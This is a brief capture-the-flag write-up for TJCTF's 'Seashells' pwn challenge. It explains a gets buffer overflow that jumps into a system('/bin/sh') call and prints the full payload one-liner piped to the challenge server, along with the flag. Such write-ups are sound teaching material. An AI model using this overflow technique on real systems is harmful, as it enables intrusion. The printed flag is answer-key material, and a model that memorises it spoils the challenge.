# Seashells
Pwn, 50

>  Written by KyleForkBomb
>  I heard there's someone selling shells? They seem to be out of stock though... nc p1.tjctf.org 8009 

This is pretty standard `gets` rop, and there's a convenient `shell` function which spawns a shell. The `shell` function checks an argument, but you can just jump past the if statement directly into the `system("/bin/sh")`. Here's the final payload (remember to use `cat -` so stdin stays open):
```
(python -c 'print "A"*18 + "\xe3\x06\x40\x00\x00\x00\x00\x00"'; cat -) | nc p1.tjctf.org 8009
```

Flag: `tjctf{she_s3lls_se4_sh3ll5}`